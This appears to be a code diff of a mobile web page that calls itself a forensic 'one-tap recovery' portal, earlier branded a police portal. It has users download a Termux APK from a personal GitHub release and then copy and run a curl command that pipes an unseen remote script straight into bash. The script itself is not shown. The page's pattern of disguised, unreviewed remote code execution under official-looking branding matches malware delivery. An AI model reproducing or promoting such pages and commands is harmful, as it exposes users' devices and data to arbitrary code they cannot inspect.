@@ -1,33 +1,144 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Quick Forensic Setup</title>
+  <title>Forensic Mobile Recovery Deployment</title>
   <style>
-    body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-    .btn { display: block; width: 90%; margin: 15px auto; padding: 15px; background: #007acc; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; border: none; font-size: 16px; }
-    .btn-copy { background: #28a745; }
-    code { background: #222; padding: 8px; display: block; margin: 10px auto; width: 90%; word-break: break-all; border-radius: 4px; color: #98c379; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #0b0d13;
+      color: #e0e6ed;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+    .container {
+      background: #131722;
+      border: 1px solid #232838;
+      border-radius: 10px;
+      padding: 24px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      text-align: center;
+    }
+    h1 {
+      font-size: 1.2rem;
+      color: #61afef;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    p.sub {
+      font-size: 0.8rem;
+      color: #abb2bf;
+      margin-bottom: 20px;
+    }
+    .step-box {
+      background: #07080c;
+      border: 1px solid #1a1e29;
+      border-radius: 6px;
+      padding: 14px;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+    .step-title {
+      font-size: 0.82rem;
+      font-weight: bold;
+      color: #98c379;
+      margin-bottom: 8px;
+      display: block;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      border-radius: 6px;
+      border: none;
+      font-weight: bold;
+      font-size: 0.9rem;
+      cursor: pointer;
+      text-decoration: none;
+      text-align: center;
+      transition: background 0.2s;
+    }
+    .btn-download {
+      background: #007acc;
+      color: #ffffff;
+    }
+    .btn-download:active {
+      background: #005999;
+    }
+    .btn-copy {
+      background: #28a745;
+      color: #ffffff;
+      margin-top: 8px;
+    }
+    .btn-copy:active {
+      background: #1e7e34;
+    }
+    .command-box {
+      background: #161922;
+      border: 1px solid #232838;
+      border-radius: 4px;
+      padding: 10px;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #e5c07b;
+      word-break: break-all;
+      user-select: all;
+    }
+    .footer-note {
+      font-size: 0.72rem;
+      color: #5c6370;
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
-  <h2>POLICE FORENSIC PORTAL</h2>
-  
-  <!-- Step 1: APK Direct Download -->
-  <a class="btn" href="https://github.com/KamleshChoudhary7/RecoveryApp/releases/download/V.1/termux.apk" download>1. DOWNLOAD TERMUX APK</a>
 
-  <!-- Step 2: Auto Copy One-Liner -->
-  <button class="btn btn-copy" onclick="copyCommand()">2. COPY AUTO-RUN COMMAND</button>
-  
-  <code id="cmd">curl -sL raw.githubusercontent.com/YOUR_USER/cop-forensic/main/run.sh | bash</code>
+<div class="container">
+  <h1>Forensic Deployment Engine</h1>
+  <p class="sub">One-Tap Recovery Setup for Mobile Devices</p>
 
-  <script>
-    function copyCommand() {
-      var text = document.getElementById('cmd').innerText;
-      navigator.clipboard.writeText(text).then(function() {
-        alert("Command Copied! Now open Termux and Long Press -> Paste");
-      });
-    }
-  </script>
+  <!-- Step 1: APK Download -->
+  <div class="step-box">
+    <span class="step-title">STEP 1: INSTALL ENVIRONMENT</span>
+    <a class="btn btn-download" href="https://github.com/KamleshChoudhary7/RecoveryApp/releases/download/v1.0/termux.apk" download>
+      DOWNLOAD TERMUX APK
+    </a>
+  </div>
+
+  <!-- Step 2: Auto-Run Command Execution -->
+  <div class="step-box">
+    <span class="step-title">STEP 2: RUN DEEP ENGINE</span>
+    <div class="command-box" id="cmdText">curl -sL https://raw.githubusercontent.com/KamleshChoudhary7/RecoveryApp/main/run.sh | bash</div>
+    <button class="btn btn-copy" onclick="copyAutoRunCommand()">COPY ONE-TAP COMMAND</button>
+  </div>
+
+  <p class="footer-note">Open Termux app &rarr; Long Press &rarr; Tap Paste &rarr; Press Enter</p>
+</div>
+
+<script>
+function copyAutoRunCommand() {
+  const text = document.getElementById('cmdText').innerText.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    alert("Command copied to clipboard!\n\nOpen Termux -> Long Press -> Paste -> Press Enter");
+  }).catch(() => {
+    const input = document.createElement('textarea');
+    input.value = text;
+    document.body.appendChild(input);
+    input.select();
+    document.execCommand('copy');
+    document.body.removeChild(input);
+    alert("Command copied to clipboard!\n\nOpen Termux -> Long Press -> Paste -> Press Enter");
+  });
+}
+</script>
+
 </body>
 </html>
